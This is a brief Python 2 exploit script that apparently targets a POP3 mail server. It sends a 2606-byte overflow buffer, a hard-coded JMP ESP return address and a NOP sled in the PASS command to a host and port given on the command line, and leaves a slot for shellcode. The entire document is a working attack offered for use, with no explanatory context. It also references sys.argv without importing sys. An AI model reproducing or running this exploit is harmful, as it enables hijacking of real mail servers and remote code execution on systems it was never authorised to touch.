import struct

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = "A" * 2606

#JMP_ESP value
buf += "\x8F\x35\x4A\x5F"

#NOP slides
buf += "\x90" * 32

#Create your payload here:
#buf += payload

try:

        print "\nSending evil buffer..."

        s.connect((sys.argv[1],int(sys.argv[2])))

        data = s.recv(1024)

        s.send('USER username' +'\r\n')

        data = s.recv(1024)

        s.send('PASS ' + buf + '\r\n')

        data = s.recv(1024)

        s.close()

except:

        print "Could not connect to POP3!"
